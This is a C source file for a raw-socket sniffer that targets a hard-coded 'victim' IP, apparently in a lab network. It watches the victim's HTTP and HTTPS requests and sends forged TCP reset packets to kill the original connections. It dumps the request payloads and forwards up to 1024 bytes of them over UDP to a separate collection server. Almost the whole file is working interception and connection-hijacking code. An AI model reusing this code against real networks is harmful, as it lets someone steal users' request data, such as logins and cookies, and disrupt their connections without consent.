#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <errno.h>
#include <stdarg.h>
#include <time.h>

#define MAX_ETHER 1518
#define INTERFACE "eth0"
#define LOCAL_SERVER_HOST "172.20.0.104"
#define LOCAL_SERVER_PORT 9090
#define VICTIM_IP "172.20.0.102"
#define SIZE_ETHERNET 14

// Checksum calculation
uint16_t chksum(unsigned char *buf, size_t buflen) {
    uint32_t sum = 0, i;
    for(i=0; i<buflen-1; i+=2) sum += *(uint16_t*)&buf[i];
    if(buflen & 1) sum += buf[buflen - 1];
    return ~((sum >> 16) + (sum & 0xffff));
}

void send_to_local_server(const char *msg) {
    int sockfd;
    struct sockaddr_in servaddr;
    char recv_buffer[1024];

    // Create UDP socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("socket creation failed");
        return;
    }

    // Configure server address
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(LOCAL_SERVER_PORT);
    servaddr.sin_addr.s_addr = inet_addr(LOCAL_SERVER_HOST);

    // Set socket timeout
    struct timeval tv;
    tv.tv_sec = 1;  // 1 second timeout
    tv.tv_usec = 0;
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    // Send message
    printf("\nSending to server: %s\n", msg);
    if (sendto(sockfd, msg, strlen(msg), 0, 
        (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
        printf("Failed to send: %s\n", strerror(errno));
        close(sockfd);
        return;
    }

    // Wait for acknowledgment
    socklen_t len = sizeof(servaddr);
    int n = recvfrom(sockfd, recv_buffer, sizeof(recv_buffer)-1, 0,
                     (struct sockaddr *)&servaddr, &len);
    
    if (n > 0) {
        recv_buffer[n] = '\0';
        printf("Received ACK: %s\n", recv_buffer);
    } else {
        printf("No acknowledgment received\n");
    }

    close(sockfd);
}

// Add debug logging function
void debug_log(const char *format, ...) {
    va_list args;
    va_start(args, format);
    time_t now = time(NULL);
    char timestamp[64];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
    printf("[DEBUG %s] ", timestamp);
    vprintf(format, args);
    printf("\n");
    fflush(stdout);
    va_end(args);
}

// Add debug print function for packet contents
void print_packet_content(unsigned char *buffer, int size) {
    printf("\n==== Packet Content ====\n");
    // Print raw bytes in hex and ASCII
    for(int i = 0; i < size; i++) {
        if(i % 16 == 0) printf("\n%04X: ", i);
        printf("%02X ", buffer[i]);
        if((i + 1) % 16 == 0) {
            printf("  ");
            // Print ASCII representation
            for(int j = i - 15; j <= i; j++) {
                if(buffer[j] >= 32 && buffer[j] <= 126)
                    printf("%c", buffer[j]);
                else
                    printf(".");
            }
        }
    }
    printf("\n=====================\n");
}

// Thêm hàm gửi TCP reset để hủy kết nối gốc
void send_tcp_reset(struct iphdr *iph, struct tcphdr *tcph) {
    debug_log("Sending TCP RST packet to %s:%d", 
              inet_ntoa(*(struct in_addr*)&iph->saddr),
              ntohs(tcph->th_sport));
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return;
    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    memset(packet, 0, sizeof(packet));
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));

    // Thiết lập IP header
    ip->version = 4;
    ip->ihl = 5;
    ip->tot_len = htons(sizeof(packet));
    ip->id = htons(rand());
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->saddr = iph->daddr;
    ip->daddr = iph->saddr;

    // Thiết lập TCP header với flag RST+ACK
    tcp->th_sport = tcph->th_dport;
    tcp->th_dport = tcph->th_sport;
    tcp->th_seq = tcph->th_ack;
    tcp->th_ack = htonl(ntohl(tcph->th_seq) + 1); // tăng seq
    tcp->th_off = 5;
    tcp->th_flags = TH_RST | TH_ACK;
    tcp->th_win = 0;

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = ip->daddr;
    sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&dest, sizeof(dest));
    close(sock);
    // Add debug after sending
    debug_log("TCP RST packet sent successfully");
}

// Add packet data dumping function
void dump_http_data(unsigned char *data, int size) {
    printf("\n=== HTTP Request Data ===\n");
    printf("Raw data in hex:\n");
    for(int i = 0; i < size; i++) {
        printf("%02x ", data[i]);
        if((i + 1) % 16 == 0) printf("\n");
    }
    
    printf("\nData as ASCII:\n");
    for(int i = 0; i < size; i++) {
        if(data[i] >= 32 && data[i] <= 126) {
            printf("%c", data[i]);
        } else {
            printf(".");
        }
    }
    printf("\n======================\n");
}

void process_packet(unsigned char *packet, int size) {
    struct iphdr *iph = (struct iphdr*)(packet + SIZE_ETHERNET);
    struct sockaddr_in source;
    source.sin_addr.s_addr = iph->saddr;

    // Only process packets from victim
    if (strcmp(inet_ntoa(source.sin_addr), VICTIM_IP) == 0) {
        if (iph->protocol == IPPROTO_TCP) {
            struct tcphdr *tcph = (struct tcphdr*)(packet + SIZE_ETHERNET + (iph->ihl * 4));
            int dest_port = ntohs(tcph->th_dport);
            
            if (dest_port == 80 || dest_port == 443) {
                printf("\n[+] Intercepted HTTP(S) request from victim\n");
                
                // 1. First send RST to kill original connection
                send_tcp_reset(iph, tcph);
                
                // 2. Extract HTTP data
                int header_size = (iph->ihl * 4) + (tcph->th_off * 4);
                unsigned char *data = packet + SIZE_ETHERNET + header_size;
                int data_size = size - SIZE_ETHERNET - header_size;

                if (data_size > 0) {
                    dump_http_data(data, data_size);
                }

                // 3. Notify local server
                char message[2048];
                snprintf(message, sizeof(message),
                        "VICTIM_HTTP from %s:%d to port %d\n%.*s",
                        VICTIM_IP, ntohs(tcph->th_sport), dest_port,
                        data_size > 1024 ? 1024 : data_size,
                        data);
                send_to_local_server(message);
                
                printf("[+] Request forwarded to local server\n");
                return; // Drop original packet
            }
        }
    }
    // Also drop packets from remote server to victim
    else if (iph->protocol == IPPROTO_TCP) {
        struct sockaddr_in dest;
        dest.sin_addr.s_addr = iph->daddr;
        if (strcmp(inet_ntoa(dest.sin_addr), VICTIM_IP) == 0) {
            return; // Drop response packets
        }
    }
}

int main() {
    int sockfd;
    struct ifreq ifr;
    unsigned char *buffer = malloc(MAX_ETHER);
    
    // Create raw socket
    sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(sockfd < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    // Get interface index
    strncpy(ifr.ifr_name, INTERFACE, IFNAMSIZ);
    if(ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
        perror("SIOCGIFINDEX");
        close(sockfd);
        exit(1);
    }

    printf("[+] Sniffer started on %s\n", INTERFACE); 
    printf("[+] Watching victim IP: %s\n", VICTIM_IP);
    printf("[+] Forwarding to: %s:%d\n", LOCAL_SERVER_HOST, LOCAL_SERVER_PORT);

    while(1) {
        int packet_size = recvfrom(sockfd, buffer, MAX_ETHER, 0, NULL, NULL);
        if(packet_size > 0) {
            process_packet(buffer, packet_size);
        }
    }

    close(sockfd);
    free(buffer);
    return 0;
}